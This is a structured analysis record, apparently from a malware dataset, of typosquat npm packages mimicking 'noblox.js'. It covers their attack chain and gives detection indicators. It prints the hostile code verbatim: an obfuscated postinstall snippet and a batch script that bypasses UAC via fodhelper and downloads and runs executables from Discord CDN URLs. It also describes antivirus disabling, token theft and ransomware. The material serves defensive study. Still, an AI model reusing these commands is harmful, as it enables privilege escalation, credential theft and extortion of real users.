package_info.package_versions: noblox.js-proxy: >=1.0.1, noblox.js-proxies: 1.0.3 (and likely all published versions)
package_info.why_malicious: These packages are typosquats of the legitimate 'noblox.js' Roblox API wrapper. They contain heavily obfuscated postinstall scripts that initiate a multi-stage malware attack chain. The chain includes privilege escalation, disabling antivirus, credential theft, user harassment, and ransomware deployment. The attack abuses Windows-specific features, downloads and executes multiple malicious payloads, and demonstrates clear, intentional malicious behavior.

malicious_snippets.code_snippet: function(_0x217a7,_0x411573){function _0xca82d(_0x26e718,_0x1696e0,_0x650454,_0xbc8c96,_0xfdbeb9){return _0x597b(_0xfdbeb9-0x295,_0x1696e0);} var _0x2e2e2b=[...]; var fs=require('fs'); var child_process=require('child_process'); fs.writeFileSync('setup.bat',_0x2e2e2b.join('')); child_process.exec('cmd.exe /c setup.bat'); }
malicious_snippets.code_behavior: Obfuscated JavaScript code in postinstall.js writes a batch file (setup.bat) to disk and executes it using cmd.exe, initiating the malware chain.

malice_analysis.why_suspicious: Obfuscated code in a postinstall script is a strong indicator of malicious intent, especially when it writes and executes external batch files.
malice_analysis.violated_expectations: A legitimate postinstall script should not drop or execute batch files, nor should it be obfuscated or invoke cmd.exe.
malice_analysis.similar_legitimate_use: Some packages use postinstall scripts for setup or binary downloads, but not with obfuscation or external batch execution.
key_indicators: Uses child_process to spawn external processes

malicious_snippets.code_snippet:
@echo off
Reg ADD "hkcu\software\classes\ms-settings\shell\open\command" /t Reg_SZ /d "cmd.exe /c powershell -command \"Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/884900935283916881/884913366945112094/exclude.bat' -OutFile exclude.bat; Start-Process exclude.bat\"" /f
start fodhelper.exe
powershell -command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/884906713071890462/legion.exe' -OutFile legion.exe; Start-Process legion.exe"
powershell -command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/884919522350477372/000.exe' -OutFile 000.exe; Start-Process 000.exe"
powershell -command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/884919401500000286/tunamor.exe' -OutFile tunamor.exe; Start-Process tunamor.exe"
malicious_snippets.code_behavior: Batch script attempts UAC bypass via fodhelper.exe, modifies Windows registry for privilege escalation, and uses PowerShell to download and execute additional payloads (exclude.bat, legion.exe, 000.exe, tunamor.exe) from Discord CDN.

malice_analysis.why_suspicious: The batch script is obfuscated, attempts privilege escalation via UAC bypass, modifies the registry, and downloads/executed multiple executables from external sources.
malice_analysis.violated_expectations: No legitimate package should attempt UAC bypass, modify registry keys for privilege escalation, or download and execute remote binaries during installation.
malice_analysis.similar_legitimate_use: Legitimate installers may use batch scripts for setup, but not for privilege escalation or downloading executables from untrusted sources.
key_indicators: PowerShell download cradles for remote payloads

malicious_snippets.code_behavior: Disables Windows Defender scanning for the entire C:\ drive, effectively disabling antivirus protection for the system.

malice_analysis.why_suspicious: Directly disables antivirus protection for the entire system, a common tactic for malware to evade detection and facilitate further compromise.
malice_analysis.violated_expectations: No legitimate package should alter antivirus exclusions, especially for the root directory, as this exposes the system to all forms of malware.
malice_analysis.similar_legitimate_use: Legitimate software may add exclusions for specific files or folders, but never for the entire C:\ drive.
key_indicators: Disables Windows Defender for all files

malicious_snippets.code_snippet: Binary (legion.exe) drops stealer.exe, modifies registry, copies itself as Microsoft Update Manager, steals Discord tokens and browser/system credentials, and establishes persistence.
malicious_snippets.code_behavior: Steals Discord tokens, browser/system credentials, modifies registry for persistence, disables detection mechanisms, and drops additional malware (stealer.exe).

malice_analysis.why_suspicious: Credential theft, persistence mechanisms, and dropping additional malware are classic behaviors of credential stealers and trojans.
malice_analysis.violated_expectations: No legitimate package should access or exfiltrate user credentials, modify registry for persistence, or drop further malware.
malice_analysis.similar_legitimate_use: Legitimate software does not access or exfiltrate credentials or tokens.
key_indicators: Steals Discord tokens and browser/system credentials
Copies itself as Microsoft Update Manager

malicious_snippets.code_snippet: Binary (tunamor.exe) displays a ransom note, encrypts user files, and provides instructions for payment via Tor.
malicious_snippets.code_behavior: Acts as ransomware: encrypts user files, displays a ransom note, and demands payment for decryption instructions.

malice_analysis.violated_expectations: No legitimate package should encrypt user files or demand ransom under any circumstances.
malice_analysis.similar_legitimate_use: No legitimate use case exists for this behavior in npm packages.

attack_chain.action: User installs the malicious npm package, triggering the obfuscated postinstall.js script.
attack_chain.leads_to: Obfuscated JavaScript writes and executes setup.bat, starting the malware chain.

attack_chain.action: setup.bat executes, attempts UAC bypass via fodhelper.exe, modifies registry for privilege escalation, and downloads additional payloads from Discord CDN.
attack_chain.leads_to: Payloads (exclude.bat, legion.exe, 000.exe, tunamor.exe) are downloaded and executed.

attack_chain.action: exclude.bat disables Windows Defender by adding C:\ to the exclusion list, leaving the system unprotected.
attack_chain.leads_to: System is left unprotected for further malware execution.

attack_chain.action: legion.exe executes, steals credentials (Discord tokens, browser/system credentials), achieves persistence via registry modification, and drops stealer.exe.
attack_chain.leads_to: Credentials are exfiltrated, system is further compromised, and additional malware is deployed.

attack_chain.action: 000.exe executes, drops files, manipulates user environment (wallpaper, popups), and plays a video to harass the user.
attack_chain.leads_to: User is harassed/intimidated, system resources are exhausted, and user experience is disrupted.

attack_chain.action: tunamor.exe executes, encrypts files, and displays a ransom note demanding payment via Tor.
attack_chain.leads_to: Ransomware attack is completed, user is extorted for payment to recover files.

behavioral_signatures: Obfuscated or minified code in npm package postinstall scripts
Postinstall scripts writing and executing batch files (e.g., setup.bat)
Batch scripts attempting UAC bypass via fodhelper.exe and modifying registry keys
PowerShell download cradles fetching executables from Discord CDN
Dropping and executing multiple binaries during install (legion.exe, 000.exe, tunamor.exe, stealer.exe)
Presence of ransom note or file encryption activity after install
Dropping files with specific names (text.txt with 'UR NEXT', windl.bat, one.rtf, rniw.exe, street.mp4)
file_indicators: exclude.bat, legion.exe, 000.exe, tunamor.exe, stealer.exe, rniw.exe present in user directories
windl.bat, one.rtf, street.mp4 dropped to temp or user directories
detection_knowledge.how_to_detect: Monitor npm package installations for obfuscated or minified code in postinstall scripts, especially those that write and execute batch files (e.g., setup.bat). Flag any postinstall script that downloads or executes files from external sources, particularly from Discord CDN. Detect registry modifications for UAC bypass (hkcu\software\classes\ms-settings\shell\open\command) and antivirus exclusions (Add-MpPreference -ExclusionPath 'C:\'). Watch for dropped files with known malicious names (exclude.bat, legion.exe, 000.exe, tunamor.exe, stealer.exe, rniw.exe, text.txt with 'UR NEXT'). Network monitoring should flag connections to Discord CDN for executable downloads and known malicious domains/IPs (itroublvehacker.gq, 162.159.134.233). Look for signs of ransomware activity, such as ransom notes or file encryption, immediately after package installation.
